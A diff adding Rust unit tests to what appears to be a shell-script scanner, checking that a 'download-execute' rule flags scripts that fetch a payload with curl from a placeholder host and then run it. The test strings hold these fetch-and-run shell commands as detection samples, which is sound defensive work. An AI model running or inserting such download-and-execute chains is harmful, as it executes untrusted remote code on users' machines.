@@ -236,6 +236,29 @@ fn staged_fetch_without_chmod_stays_silent() {
 }
 
 #[test]
+fn staged_fetch_interpreter_executes_without_chmod() {
+    let source =
+        "#!/bin/sh\ncurl https://example.test/payload -o /tmp/oma-payload\nsh /tmp/oma-payload\n";
+    let (artifacts, _) = analyze("install.sh", PayloadKind::Shell, source);
+    assert!(artifacts.rendered_findings().iter().any(|finding| {
+        finding.rule_id == "oma.script.download-execute"
+            && finding.evidence.contains(":interpreter:")
+    }));
+}
+
+#[test]
+fn staged_fetch_is_killed_by_a_replacement_write() {
+    let source = "#!/bin/sh\ncurl https://example.test/payload -o /tmp/oma-payload\necho safe > /tmp/oma-payload\nsh /tmp/oma-payload\n";
+    let (artifacts, _) = analyze("install.sh", PayloadKind::Shell, source);
+    assert!(
+        !artifacts
+            .rendered_findings()
+            .iter()
+            .any(|finding| { finding.rule_id == "oma.script.download-execute" })
+    );
+}
+
+#[test]
 fn staged_chain_ignores_shell_comments_but_keeps_url_fragments() {
     let source = "#!/bin/sh\n# curl https://example.test/#payload -o /tmp/fetched\n# chmod +x /tmp/fetched\n# /tmp/fetched\ncurl https://example.test/#payload -o /tmp/live\nchmod +x /tmp/live # release the downloaded file\n/tmp/live\n";
     let (artifacts, _) = analyze("comments.sh", PayloadKind::Shell, source);
